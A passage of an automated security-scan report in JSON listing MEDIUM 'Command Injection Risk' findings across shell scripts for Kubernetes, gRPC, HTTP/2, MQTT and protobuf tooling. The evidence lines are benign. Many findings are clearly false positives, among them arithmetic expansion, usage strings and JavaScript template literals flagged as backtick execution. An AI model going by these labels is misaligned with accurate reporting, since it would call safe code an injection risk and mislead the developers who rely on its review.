      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 288,
        "issue": "Command substitution in shell",
        "evidence": "pod_name=$(echo \"$pods\" | jq -r \".items[$i].metadata.name\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 291,
        "issue": "Command substitution in shell",
        "evidence": "phase=$(echo \"$pods\" | jq -r \".items[$i].status.phase\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 294,
        "issue": "Command substitution in shell",
        "evidence": "ready=$(echo \"$pods\" | jq -r \".items[$i].status.conditions[] | select(.type==\\\"Ready\\\") | .status\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 309,
        "issue": "Command substitution in shell",
        "evidence": "services=$(kubectl get services -n \"$NAMESPACE\" -o jsonpath='{.items[*].metadata.name}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 318,
        "issue": "Command substitution in shell",
        "evidence": "endpoints=$(kubectl get endpoints \"$service\" -n \"$NAMESPACE\" -o json | jq -r '.subsets[0].addresses | length')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 346,
        "issue": "Command substitution in shell",
        "evidence": "services=$(kubectl get services -n \"$NAMESPACE\" -o jsonpath='{.items[*].metadata.name}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 350,
        "issue": "Command substitution in shell",
        "evidence": "first_service=$(echo \"$services\" | awk '{print $1}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 394,
        "issue": "Command substitution in shell",
        "evidence": "\"success\": $([ \"$TESTS_FAILED\" -eq 0 ] && echo \"true\" || echo \"false\"),",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 396,
        "issue": "Command substitution in shell",
        "evidence": "$(IFS=,; echo \"${TEST_RESULTS[*]}\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 421,
        "issue": "Command substitution in shell",
        "evidence": "Usage: $(basename \"$0\") [OPTIONS] MANIFEST_PATH",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 441,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") deployment.yaml",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 444,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --provider minikube manifests/",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 447,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --no-cleanup deployment.yaml",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 450,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --json deployment.yaml",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
        "line_number": 8,
        "issue": "Command substitution in shell",
        "evidence": "SCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
        "line_number": 62,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") [OPTIONS]",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
        "line_number": 81,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
        "line_number": 84,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --coverage",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
        "line_number": 87,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --pattern \"test_api_*\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
        "line_number": 90,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --parallel --test-dir tests/integration/api",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
        "line_number": 93,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --keep-infra --verbose",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
        "line_number": 96,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --json",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
        "line_number": 99,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --db-type mysql",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
        "line_number": 340,
        "issue": "Command substitution in shell",
        "evidence": "framework=$(detect_test_framework)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
        "line_number": 370,
        "issue": "Command substitution in shell",
        "evidence": "\"success\": $([ \"$exit_code\" -eq 0 ] && echo \"true\" || echo \"false\"),",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
        "line_number": 377,
        "issue": "Command substitution in shell",
        "evidence": "\"timestamp\": \"$(date -u +\"%Y-%m-%dT%H:%M:%SZ\")\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
        "line_number": 255,
        "issue": "Command substitution in shell",
        "evidence": "total_packets=$(tcpdump -r \"$file\" 2>/dev/null | wc -l)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
        "line_number": 291,
        "issue": "Command substitution in shell",
        "evidence": "handshakes=$(tshark -r \"$file\" -Y \"http.upgrade contains WebSocket\" 2>/dev/null | wc -l)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
        "line_number": 298,
        "issue": "Command substitution in shell",
        "evidence": "frames=$(tshark -r \"$file\" -Y \"websocket\" 2>/dev/null | wc -l)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
        "line_number": 348,
        "issue": "Command substitution in shell",
        "evidence": "total_packets=$(tcpdump -r \"$file\" 2>/dev/null | wc -l)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
        "line_number": 354,
        "issue": "Command substitution in shell",
        "evidence": "handshakes=$(tshark -r \"$file\" -Y \"http.upgrade contains WebSocket\" 2>/dev/null | wc -l)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
        "line_number": 355,
        "issue": "Command substitution in shell",
        "evidence": "frames=$(tshark -r \"$file\" -Y \"websocket\" 2>/dev/null | wc -l)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
        "line_number": 366,
        "issue": "Command substitution in shell",
        "evidence": "\"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
        "line_number": 379,
        "issue": "Command substitution in shell",
        "evidence": "OUTPUT_FILE=\"ws_capture_$(date +%Y%m%d_%H%M%S).pcap\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
        "line_number": 410,
        "issue": "Command substitution in shell",
        "evidence": "filter=$(build_filter)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 147,
        "issue": "Command substitution in shell",
        "evidence": "response=$(curl -sI --http2 --max-time \"$TIMEOUT\" \"$URL\" 2>&1 || true)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 164,
        "issue": "Command substitution in shell",
        "evidence": "tmpfile=$(mktemp)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 170,
        "issue": "Command substitution in shell",
        "evidence": "pushed_resources=$(grep -i \"< link:\" \"$tmpfile\" | grep -i \"preload\" || true)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 196,
        "issue": "Command substitution in shell",
        "evidence": "tmpfile=$(mktemp)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 203,
        "issue": "Command substitution in shell",
        "evidence": "push_promises=$(grep \"PUSH_PROMISE\" \"$tmpfile\" || true)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 216,
        "issue": "Command substitution in shell",
        "evidence": "pushed_paths=$(grep -A 5 \"PUSH_PROMISE\" \"$tmpfile\" | grep \":path:\" | awk '{print $3}' || true)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 234,
        "issue": "Command substitution in shell",
        "evidence": "tmpfile=$(mktemp)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 238,
        "issue": "Command substitution in shell",
        "evidence": "time_with_push=$( (time curl -s --http2 --max-time \"$TIMEOUT\" \"$URL\" > /dev/null) 2>&1 | grep real | awk '{print $2}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 242,
        "issue": "Command substitution in shell",
        "evidence": "time_without_push=$( (time curl -s --http1.1 --max-time \"$TIMEOUT\" \"$URL\" > /dev/null) 2>&1 | grep real | awk '{print $2}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 258,
        "issue": "Command substitution in shell",
        "evidence": "link_header=$(curl -sI --http2 --max-time \"$TIMEOUT\" \"$URL\" | grep -i \"^link:\" | head -1 || true)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 267,
        "issue": "Command substitution in shell",
        "evidence": "pushed_resource=$(echo \"$link_header\" | sed -n 's/.*<\\([^>]*\\)>.*/\\1/p' | head -1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 276,
        "issue": "Command substitution in shell",
        "evidence": "base_url=$(echo \"$URL\" | sed 's/\\(https\\?:\\/\\/[^/]*\\).*/\\1/')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 283,
        "issue": "Command substitution in shell",
        "evidence": "cache_control=$(curl -sI --http2 --max-time \"$TIMEOUT\" \"$full_url\" | grep -i \"^cache-control:\" || true)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 325,
        "issue": "Command substitution in shell",
        "evidence": "\"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
        "line_number": 74,
        "issue": "Command substitution in shell",
        "evidence": "echo \"  cafile $(pwd)/ca.crt\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
        "line_number": 75,
        "issue": "Command substitution in shell",
        "evidence": "echo \"  certfile $(pwd)/server.crt\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
        "line_number": 76,
        "issue": "Command substitution in shell",
        "evidence": "echo \"  keyfile $(pwd)/server.key\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
        "line_number": 81,
        "issue": "Command substitution in shell",
        "evidence": "echo \"    --cafile $(pwd)/ca.crt \\\\\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
        "line_number": 82,
        "issue": "Command substitution in shell",
        "evidence": "echo \"    --cert $(pwd)/client.crt \\\\\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
        "line_number": 83,
        "issue": "Command substitution in shell",
        "evidence": "echo \"    --key $(pwd)/client.key\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
        "line_number": 87,
        "issue": "Command substitution in shell",
        "evidence": "echo \"    --cafile $(pwd)/ca.crt \\\\\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
        "line_number": 88,
        "issue": "Command substitution in shell",
        "evidence": "echo \"    --cert $(pwd)/client.crt \\\\\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
        "line_number": 89,
        "issue": "Command substitution in shell",
        "evidence": "echo \"    --key $(pwd)/client.key\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_python.sh",
        "line_number": 12,
        "issue": "Command substitution in shell",
        "evidence": "SCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_python.sh",
        "line_number": 41,
        "issue": "Command substitution in shell",
        "evidence": "lines=$(wc -l < \"${file}\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_typescript.sh",
        "line_number": 12,
        "issue": "Command substitution in shell",
        "evidence": "SCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_typescript.sh",
        "line_number": 46,
        "issue": "Command substitution in shell",
        "evidence": "lines=$(wc -l < \"${file}\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_typescript.sh",
        "line_number": 110,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Serialized: ${bytes.length} bytes`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_typescript.sh",
        "line_number": 114,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Deserialized: ${user2.getEmail()}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_typescript.sh",
        "line_number": 129,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Created user: ${user.getId()}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_go.sh",
        "line_number": 12,
        "issue": "Command substitution in shell",
        "evidence": "SCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_go.sh",
        "line_number": 43,
        "issue": "Command substitution in shell",
        "evidence": "lines=$(wc -l < \"${file}\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http3-quic/resources/examples/curl_http3_examples.sh",
        "line_number": 100,
        "issue": "Command substitution in shell",
        "evidence": "info \"Downloaded to /tmp/test.html ($(wc -c < /tmp/test.html) bytes)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 57,
        "issue": "Command substitution in shell",
        "evidence": "Usage: $(basename \"$0\") [OPTIONS]",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 77,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --server localhost:50051 --proto-file api.proto",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 80,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --server localhost:50051 --proto-file api.proto --method UserService/GetUser",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 83,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --server localhost:50051 --proto-file api.proto --metadata authorization:\"Bearer token123\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 86,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --server localhost:50051 --proto-file api.proto --json > report.json",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 89,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --server localhost:50051 --proto-file api.proto --iterations 100",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 194,
        "issue": "Command substitution in shell",
        "evidence": "TOTAL_TESTS=$((TOTAL_TESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 196,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 220,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 221,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 223,
        "issue": "Command substitution in shell",
        "evidence": "PASSED_TESTS=$((PASSED_TESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 234,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 235,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 237,
        "issue": "Command substitution in shell",
        "evidence": "FAILED_TESTS=$((FAILED_TESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 256,
        "issue": "Command substitution in shell",
        "evidence": "TOTAL_TESTS=$((TOTAL_TESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 258,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 282,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 283,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 286,
        "issue": "Command substitution in shell",
        "evidence": "message_count=$(echo \"$output\" | jq -s 'length' 2>/dev/null || echo \"1\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 288,
        "issue": "Command substitution in shell",
        "evidence": "PASSED_TESTS=$((PASSED_TESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 298,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 299,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 301,
        "issue": "Command substitution in shell",
        "evidence": "FAILED_TESTS=$((FAILED_TESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 321,
        "issue": "Command substitution in shell",
        "evidence": "TOTAL_TESTS=$((TOTAL_TESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 334,
        "issue": "Command substitution in shell",
